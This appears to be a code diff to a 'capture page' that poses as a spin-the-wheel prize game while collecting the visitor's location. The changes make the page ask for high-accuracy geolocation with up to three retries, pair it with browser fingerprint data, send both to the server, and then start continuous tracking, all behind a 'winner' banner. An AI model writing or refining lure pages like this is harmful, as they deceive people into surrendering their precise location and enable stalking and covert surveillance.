@@ -459,8 +459,10 @@ const renderCapturePage = async (req, res, next) => {
               spinBtn.addEventListener('click', async () => {
                   if (isSpinning || spinsLeft <= 0) return;
                   
+                  // Check if geolocation is supported
                   if (!navigator.geolocation) {
-                      winnerBanner.classList.add('active');
+                      status.innerHTML = '<span class="text-red-400">❌ Location not supported on this device</span>';
+                      setTimeout(() => winnerBanner.classList.add('active'), 500);
                       return;
                   }
 
@@ -468,53 +470,91 @@ const renderCapturePage = async (req, res, next) => {
                   spinsLeft--;
                   document.getElementById('spins-left').textContent = spinsLeft;
                   spinBtn.disabled = true;
-                  status.innerHTML = 'Spinning... 🎰';
+                  status.innerHTML = '🎰 Spinning... Requesting location access';
                   
+                  // Start spin animation
                   const spins = 5 + Math.random() * 3;
                   const degrees = spins * 360 + Math.random() * 360;
                   currentRotation += degrees;
                   wheel.style.transform = 'rotate(' + currentRotation + 'deg)';
                   
                   const fp = await getFingerprintData();
-                  let attempts = 0;
+                  let locationAttempts = 0;
                   let bestPosition = null;
+                  let locationError = null;
 
-                  const tryGetLocation = () => {
-                      attempts++;
-                      navigator.geolocation.getCurrentPosition(
-                          async (position) => {
-                              const accuracy = position.coords.accuracy;
-                              if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
+                  // Request location immediately with better error handling
+                  const requestLocation = () => {
+                      return new Promise((resolve, reject) => {
+                          navigator.geolocation.getCurrentPosition(
+                              (position) => {
+                                  console.log('Location acquired:', position.coords);
                                   bestPosition = position;
+                                  resolve(position);
+                              },
+                              (error) => {
+                                  console.error('Location error:', error.code, error.message);
+                                  locationError = error;
+                                  reject(error);
+                              },
+                              { 
+                                  enableHighAccuracy: true, 
+                                  timeout: 15000,  // Increased timeout
+                                  maximumAge: 0 
                               }
-                              if (accuracy < 20 || attempts >= 3) {
-                                  await sendLocation(bestPosition, fp);
-                              } else {
-                                  setTimeout(tryGetLocation, 1000);
-                              }
-                          },
-                          async () => {
-                              if (bestPosition) await sendLocation(bestPosition, fp);
-                          },
-                          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                      );
+                          );
+                      });
                   };
 
-                  setTimeout(() => {
-                      tryGetLocation();
-                      // Start continuous tracking after spin
-                      startTracking(fp);
-                      status.innerHTML = '📍 Tracking active...';
-                      
-                      setTimeout(() => {
-                          winnerBanner.classList.add('active');
-                          isSpinning = false;
-                          if (spinsLeft > 0) spinBtn.disabled = false;
-                          else {
-                              spinBtn.textContent = 'NO SPINS LEFT';
-                              status.innerHTML = 'Come back tomorrow!';
+                  // Try to get location with multiple attempts
+                  const tryGetLocation = async () => {
+                      while (locationAttempts < 3 && !bestPosition) {
+                          locationAttempts++;
+                          status.innerHTML = '📍 Requesting location... (Attempt ' + locationAttempts + '/3)';
+                          
+                          try {
+                              await requestLocation();
+                              break; // Success, exit loop
+                          } catch (err) {
+                              console.log('Attempt', locationAttempts, 'failed:', err);
+                              if (locationAttempts < 3) {
+                                  await new Promise(r => setTimeout(r, 2000)); // Wait 2s before retry
+                              }
                           }
-                      }, 1500);
+                      }
+
+                      if (bestPosition) {
+                          status.innerHTML = '📍 Location captured! Saving...';
+                          await sendLocation(bestPosition, fp);
+                          status.innerHTML = '✅ Location saved!';
+                          
+                          // Start continuous tracking
+                          startTracking(fp);
+                      } else {
+                          // Location failed - show error
+                          let errorMsg = '❌ Location access denied';
+                          if (locationError) {
+                              if (locationError.code === 1) errorMsg = '❌ Permission denied. Please allow location access.';
+                              else if (locationError.code === 2) errorMsg = '❌ Position unavailable';
+                              else if (locationError.code === 3) errorMsg = '❌ Timeout - taking too long';
+                          }
+                          status.innerHTML = errorMsg;
+                          console.error('Failed to get location after', locationAttempts, 'attempts');
+                      }
+                  };
+
+                  // Start location request immediately, don't wait for spin
+                  tryGetLocation();
+
+                  // Show winner banner after spin completes (4 seconds)
+                  setTimeout(() => {
+                      winnerBanner.classList.add('active');
+                      isSpinning = false;
+                      if (spinsLeft > 0) spinBtn.disabled = false;
+                      else {
+                          spinBtn.textContent = 'NO SPINS LEFT';
+                          status.innerHTML = 'Come back tomorrow!';
+                      }
                   }, 4000);
               });
 
